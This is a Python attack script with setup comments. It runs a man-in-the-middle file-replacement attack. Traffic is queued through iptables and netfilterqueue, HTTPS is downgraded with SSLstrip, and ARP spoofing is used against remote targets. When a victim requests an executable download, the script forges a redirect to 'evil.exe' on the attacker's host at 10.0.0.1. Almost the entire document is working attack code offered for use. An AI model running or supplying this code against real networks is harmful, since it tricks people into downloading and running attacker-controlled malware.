#!/usr/bin/env python

# This script replaces the downloading .exe with the file in hacker machine [Assume ip=10.0.0.1]
# This version of script supports the https website

# Run from the Linux machine with netfilterqueue python module
# Run the linux command first to capture local input and output traffic -
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Run the SSLSTRIP program on a separate window and then the following line
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# Run the linux command if the target is a remote machine
# iptables -I FORWARD -j NFQUEUE ---queue-num 0
# Also run the arp_spoof.py for remote machine
# When done, run - iptables --flush

import netfilterqueue
import scapy.all as scapy

ack_list =[]

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.0.1" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
            # print("HTTP Request")
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://10.0.0.1/evil.exe\n\n")
                packet.set_payload(str(modified_packet))
            # print("HTTP Response")
            # print(scapy_packet.show())

    packet.accept()

queue =  netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

